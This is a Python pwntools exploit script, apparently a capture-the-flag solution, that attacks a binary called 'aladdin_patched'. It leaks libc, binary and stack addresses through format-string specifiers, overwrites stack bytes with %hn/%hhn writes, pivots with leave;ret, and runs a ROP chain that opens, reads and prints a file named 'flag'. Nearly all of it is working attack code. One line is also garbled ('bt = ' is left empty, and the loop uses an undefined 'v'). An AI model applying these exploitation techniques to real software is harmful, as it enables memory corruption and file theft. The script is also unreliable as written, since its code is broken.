from pwn import *

context.log_level = 'debug'
r = process("./aladdin_patched")
libc = ELF("./libc.so.6")
elf  = ELF("./aladdin_patched")

r.sendafter(b"wish:\n", b'%15$p %17$p %7$p ')
libc.address = int(r.recvuntil(b' ').decode(), 16)-(0x7ffff7dbcd90-0x7ffff7d93000)
elf.address = int(r.recvuntil(b' ').decode(), 16)
stack_addr = int(r.recvuntil(b' ').decode(), 16) - 0x100
print(f"libc addr: {hex(libc.address)}")
print(f"elf addr: {hex(elf.address)}")
print(f"stack addr: {hex(stack_addr)}")

# b *(main+429)
r.sendafter(b"wish:\n", f"%{(stack_addr+0x38)&0xffff}c%19$hn".encode())
r.sendafter(b"wish:\n", f"%{0x89&0xff}c%49$hhn".encode())
pause()

leave_ret = elf.address+0x1425
pop_rdi = libc.address + 0x000000000002a3e5 # pop rdi ; ret
pop_rsi = libc.address + 0x000000000002be51 # pop rsi ; ret
pop_rdx = libc.address + 0x00000000000796a2 # pop rdx ; ret
pop_rax = libc.address + 0x0000000000045eb0 # pop rax ; ret
syscall = libc.sym['getpid'] + 9

for i in range(8):
    bt = 
    r.sendafter(b":\n", f"%{(stack_addr-0x18+i)&0xff}c%19$hhn".encode())
    r.sendafter(b":\n", f"%{v}c%49$hhn".encode())
for i, v in enumerate(p64(leave_ret)[:6]):
    r.sendafter(b":\n", f"%{(stack_addr-0x10+i)&0xff}c%19$hhn".encode())
    r.sendafter(b":\n", f"%{v}c%49$hhn".encode())
 
pay  = b'one more wish'.ljust(0x10, b'\x00') + b'flag'.ljust(8, b'\x00')
pay += flat([pop_rdi, elf.sym['wish']+0x10, pop_rsi, 0, pop_rax, 2, syscall,
             pop_rdi, 3, pop_rsi, elf.sym['wish']+0x100, pop_rdx, 0x50, pop_rax,0, syscall,
             pop_rdi, 1, pop_rax, 1, syscall
])
r.sendafter(b"wish:\n", pay)

r.interactive()
